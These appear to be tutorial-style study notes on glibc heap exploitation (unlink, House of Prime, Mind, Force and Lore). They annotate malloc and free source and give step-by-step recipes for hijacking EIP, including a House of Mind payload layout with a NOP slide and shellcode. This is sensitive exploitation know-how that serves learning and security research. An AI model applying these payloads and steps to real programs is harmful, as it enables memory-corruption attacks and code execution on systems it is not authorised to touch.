## Unlink Explot

```C
#define unlink(P, BK, FD) {                                            
  FD = P->fd;                                                          
  BK = P->bk;                                                          
  FD->bk = BK;                                                         
  BK->fd = FD;                                                         
}

```
#### 1) Control Flow

when free() is called --->  It checks if next chunk is free then it unlink the next chunk from list and merge it .


####  2) Ingredient For exploit 

	buf1 = malloc(50); \\   overflow heap
	buf2 = malloc(100); \\  attacker control heap
	strcpy(buf1,argv[1]);

	free(buf1); \\ Triggers vuln 
	free(buf2); 


####  3) Exploit 

      a) Make second chunk as free (overwrite size of second_chunk to 0 )
      b) place fd,bk in second chunk 

To make second chunk  free:
       The free uses the below function to check if a chunk  it is free :
```C
      #define inuse_bit_at_offset(p, s)   (((mchunkptr) (((char *) (p)) + (s)))->size & PREV_INUSE)
```

hence if size is 0 then it points itself hence it's inuse_bit is 0 hence free() belives it as free !!!!!!!!!!!



####  4) Patch 

     __builtin_expect (FD->bk != P || BK->fd != P, 0)



## House of Prime 


#### 1) Ingredients 

```C
        char *overflowed_ptr = (char *)malloc(256);
        char *ptr1 = (char *)malloc(256);
        char *ptr2 = (char *)malloc(256);
        char *ptr3;
        /* overflow on overflowed_ptr */
        free(ptr1);
        free(ptr2);
        ptr3 = (char *)malloc(256);

```
#### 2) Code flow 

```C
void
_int_free(mstate av, Void_t* mem)
{
  mchunkptr       p;           /* chunk corresponding to mem */
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr*    fb;          /* associated fastbin */
  
  p = mem2chunk(mem);
  size = chunksize(p);
  
    /*
    If eligible, place chunk on a fastbin so it can be found
    and used quickly in malloc.
  */

  if ((unsigned long)(size) <= (unsigned long)(av->max_fast)
   
   {

     if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
      {
	errstr = "free(): invalid next size (fast)";
	goto errout;
      }

    set_fastchunks(av);
    fb = &(av->fastbins[fastbin_index(size)]);
  
    if (__builtin_expect (*fb == p, 0))
      {
	errstr = "double free or corruption (fasttop)";
	goto errout;
      }
    p->fd = *fb;
    *fb = p;      <<<<======= exploit vector !!
  }
    
 #define fastbin_index(sz)        ((((unsigned int)(sz)) >> 3) - 2)  
 
 
Void_t* _int_malloc(mstate av, size_t bytes)
{
  INTERNAL_SIZE_T nb;               /* normalized request size */
  unsigned int    idx;              /* associated bin index */
  mbinptr         bin;              /* associated bin */
  mfastbinptr*    fb;               /* associated fastbin */

  mchunkptr       victim;           /* inspected/selected chunk */

  /*  Convert request size to internal form  */

  checked_request2size(bytes, nb);

  /*  If the size qualifies as a fastbin, first check corresponding bin. */

  if ((unsigned long)(nb) <= (unsigned long)(av->max_fast)) {
    long int idx = fastbin_index(nb);
    fb = &(av->fastbins[idx]);           <<<<<====== fastbin method
    if ( (victim = *fb) != 0) {
      if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
	malloc_printerr (check_action, "malloc(): memory corruption (fast)",
			 chunk2mem (victim));
      *fb = victim->fd;
      check_remalloced_chunk(av, victim, nb);
      return chunk2mem(victim);
    }
  } 
 


for(;;) {

  while ( (victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) 
  
  {
    
    bck = victim->bk;
    
    if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)  || __builtin_expect (victim->size > av->system_mem, 0))
      malloc_printerr (check_action, "malloc(): memory corruption",chunk2mem (victim));
    
    size = chunksize(victim);

   /* remove from unsorted list */    <<<=== unsorted chunk method !!!!!
 
      unsorted_chunks(av)->bk = bck;
      bck->fd = unsorted_chunks(av);

      /* Take now instead of binning if exact fit */

      if (size == nb) {
        set_inuse_bit_at_offset(victim, size);
	
      if (av != &main_arena)
              victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk(av, victim, nb);
              return chunk2mem(victim);
      }
 
 
```

#### 3) Explot  
 
      a) During free(ptr1) :   set size of ptr1 = 0x09 , ptr1+0x8 (fake ptr2 size) > 8 
          now fastbin index would be -1 and max_fast will be overwritten with ptr1 0x80xxxxx
      b)  During free(ptr2) : set size of real ptr2 to 0x919 ((289 + 2) << 3 = 0x918)
          now areana_key overwritten with ptr2
          
      c) During malloc(size):
            
#### Fastbin method
      
               a) if size < max_fast<-->i.e  ptr2 size feild
                  then set a fake fastbin entry and return some stack area u control 
                  set stack location to size of ptr2
               ii) the fastbin index of returned chunk  is computed if it matches then the chunk is returned
                  which is now stack region hence overwrite eip and pwn it !!!!
      
#### Unsorted chunk  method         
         
               b) if size > max_fast 
               
                  the unsorted bin is searched , the chunks are moved to  respective bins  
                  now unsorted_chunks(av) returns &(av->bins[0])
                  
                  Steps to be done
                     i)   &(av->bins[0])+12 {i.e victim} : &(av->bins[0])+4
                     ii)  &(av->bins[0])+16 {i.e bck}    : &eip+8
                     iii) jmp instruction in &(av->bins[0]) {unsorted_chunks(av)->bk = bck  }
                     iv)  bck->fd = EIP = &(av->bins[0]) // place a shellcode here 
         


## House of mind


####  1) Ingredients:

    One free() of a chunk under the control of the exploiter
    A sufficiently large memory space where the exploiter can write

#### 2) Code flow 

```C

void
public_fREe(Void_t* mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */
  
  p = mem2chunk(mem);

  ar_ptr = arena_for_chunk(p);

  _int_free(ar_ptr, mem);
  (void)mutex_unlock(&ar_ptr->mutex);
}

#define HEAP_MAX_SIZE (1024*1024) /* must be a power of two */

#define heap_for_ptr(ptr) \
 ((heap_info *)((unsigned long)(ptr) & ~(HEAP_MAX_SIZE-1)))

/* check for chunk from non-main arena */
#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)

#define arena_for_chunk(ptr) \
 (chunk_non_main_arena(ptr) ? heap_for_ptr(ptr)->ar_ptr : &main_arena)

```

#### 3) Road map  

The arena_for_chunk macro just checks if the NON_MAIN_ARENA flag is set if the flag is not set, then the main_arena pointer is returned, otherwise  the heap_for_ptr just performs a “ptr AND 0xFFF00000” and returns the result. 


 The trick is to make the program allocate more and more memory until a chunk is allocated over 0x08100000 in order to have the heap_info structure “located” at 0x08100000.
 
 Now we control ar_ptr i.e first var in heap_info struct 
 
 If the following conditions on the chunk are met, then the unsorted_chunks code is executed:
 
 
   * The size of the chunk must not be less than av->max_fast
   * The IS_MMAPPED bit of the size cannot be set
   * The overflowed chunk cannot equal av->top
   * The NONCONTIGUOUS_BIT of av->max_fast must be set
   * The PREV_INUSE bit of the nextchunk (chunk + size) must be set
   * The size of nextchunk must be greater than 8
   * The size of nextchunk must be less than av->system_mem
   * The PREV_INUSE bit of the chunk must not be set
   * The nextchunk cannot equal av->top
   * The PREV_INUSE bit of the chunk after nextchunk (nextchunk + nextsize) must be set

If all these conditions are met, then the following piece of code is executed:
```
bck = unsorted_chunks(av);  // bck = &(av-bins[0])
fwd = bck->fd;   [derefrenced once ]
p->bk = bck;         <<<<==== same as unlink !!!
p->fd = fwd;
bck->fd = p;  
fwd->bk = p;    [written once]
```

when free(0x8100000) happens the heap_for_ptr() returns ptr itself (since size is modified by overflow) 
now heap_for_ptr()->ar_ptr makes us control of ar_ptr and let's say we set it 1 chunk addr+8
and place shellcode in p  , fwd->bk (let's say eip) = p (shellcode addr).

#### 4) payload 

```
0xAA 0xAA 0xAA 0xAA            will be overwritten with garbage by free()
0xAA 0xAA 0xAA 0xAA            will be overwritten with garbage by free()

0x00 0x00 0x00 0x00            av->mutex = 0

0x02 0x01 0x00 0x00            -\
0x02 0x01 0x00 0x00             |
0x02 0x01 0x00 0x00             | av->max_fast = 0x102 = 258
0x02 0x01 0x00 0x00             | (written multiple times just to be
0x02 0x01 0x00 0x00             | sure of hitting it)
0x02 0x01 0x00 0x00             |
0x02 0x01 0x00 0x00             |
0x02 0x01 0x00 0x00            -/

0x...  DTORS_END-12            -\
0x...  DTORS_END-12             | av->bins[0]
[...]                           | repeated 246 times 
0x...  DTORS_END-12            -/

0x09 0x04 0x00 0x00 malloc'ed chunk's size    -\
0x41 0x41 0x41 0x41 -\                         |
[...]                | garbage data * 257      |
0x41 0x41 0x41 0x41 -/                         | repeated 721 times
[...]                                          | (all the chunks)
0x09 0x04 0x00 0x00                            |
0x41 0x41 0x41 0x41                            |
[...]                                          |
0x41 0x41 0x41 0x41                           -/

0x09 0x04 0x00 0x00           size
1ST CHUNK ADDR + 8            -\
1ST CHUNK ADDR + 8             | this is the memory address returned that
1ST CHUNK ADDR + 8             | will be returned by heap_for_ptr: it is
1ST CHUNK ADDR + 8             | necessary to write the correct address for
[...]                          | ar_ptr here (256 times)
1ST CHUNK ADDR + 8            -/

0xEB 0x0C 0x90 0x90           jmp + 12

0x0D 0x04 0x00 0x00           size | NON_MAIN_ARENA

0x90 0x90 0x90 0x90           small NOP slide
0x90 0x90 0x90 0x90
0x.. 0x.. SHELLCODE
```
   
##### Fastbin method (This works even now !!! )

if size of ptr2 = 16 then make ar_ptr = pointing to stack ; fb = &(av->fastbins[0]) {under our control} 
*fb = p [derefrenced and written]

```
STACK:   ^
         |
         |      0xRAND_VAL     av->system_mem (av + 1848)
         |         ...
         |      pushed EIP     av->fastbins[0]
         |      pushed EBP     av->max_fast
         |      0x00000000     av->mutex
         |
```


## House of Force 

The most expected one and the easiest too :)

#### Ingredients:

  *  The exploiter must be able to overwrite the top chunk (i.e. the overflow must happen in a chunk that allows to overwrite the wilderness
  *  There is a malloc() call with an exploiter-controllable size
  *  There is another malloc() call where data are controlled by the exploiter

#### Exploit 

    1) overflow wilderness chunk and make it's size to 0xffffffff
    2) malloc(len) split the chunk so that wilderness chunk will now point to eip 
    3) malloc(16) now u get eip and overwrite it 
    
    NOTE : while calculating len u have to iadjust it manually  since the len will be 8 byte  alligned  
    
## House of Lore

#### Ingredients:


   * Two chunks are allocated and the first one is overflowable
   * The second chunk is freed
   * Another (potentially more) chunk, bigger than the second one, is allocated
   * A new chunk with the same size of the second one is allocated
   * Another chunk with the same size of the second one is allocated

#### Code flow

```C


void _int_malloc(mstate av, size_t bytes)
{
checked_request2size(bytes, nb);
  if ((unsigned long)(nb) <= (unsigned long)(av->max_fast)) {
    [...]
  }
    if (in_smallbin_range(nb)) {
    idx = smallbin_index(nb);
    bin = bin_at(av,idx);

    if ( (victim = last(bin)) != bin) {
      if (victim == 0) /* initialization check */
        malloc_consolidate(av);
      else {
        bck = victim->bk;
	if (bck->fd != victim)
	 {
	 printf("small bin corruption !!!\n");       <<<<<==== hardening 
	 }
        set_inuse_bit_at_offset(victim, nb);
        bin->bk = bck;       <<<=============  Exploit vector
        bck->fd = bin;

        if (av != &main_arena)
	  victim->size |= NON_MAIN_ARENA;
        check_malloced_chunk(av, victim, nb);
        return chunk2mem(victim);
      }
}


```
    
#### Exploit 

##### Small bin corruption 
    1) We have one overflowable chunk (i.e chunk_a) , ond chunk_b behind it 
    2) now free chunk_b , now that chunk goes into unsorted bin list
    3) now malloc(large_len)  , now chunk_b moves into small bin 
    4) now corrupt chunk_b  using chunk_a
    5) now malloc(same_len) makes free() to unlink our currupted chunk_b , and trigers vuln 
       * now bin->bk overwriiten with  chunk_b->bk(i.e corrupted with say a stack value)
       * also u have to control 3 values in stack to bypass the hardening 
    6) again malloc(same_len) would return stack value for us to play with !!!!
